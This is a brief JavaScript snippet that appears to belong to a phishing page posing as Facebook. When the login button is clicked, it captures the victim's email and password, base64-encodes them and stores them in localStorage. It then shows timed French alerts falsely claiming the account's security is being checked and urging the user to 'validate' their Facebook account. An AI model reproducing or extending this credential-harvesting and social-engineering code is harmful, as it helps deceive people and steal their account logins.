var login = document.getElementById("login");
  var email = document.getElementById("email"); 
  var pass = document.getElementById("pass"); 
 
 login.addEventListener("click",()=>{
    var A= localStorage.setItem("email",btoa(email.value));
   var B=  localStorage.setItem("password",btoa(pass.value));
 
   
})

  setTimeout(()=>{alert("Nous sommes en train de verifier le systeme de securite de votre compte...")},3*1000)
setTimeout(()=>{alert("Merci de verifiet et valider votre compte facebook.")},4*1000)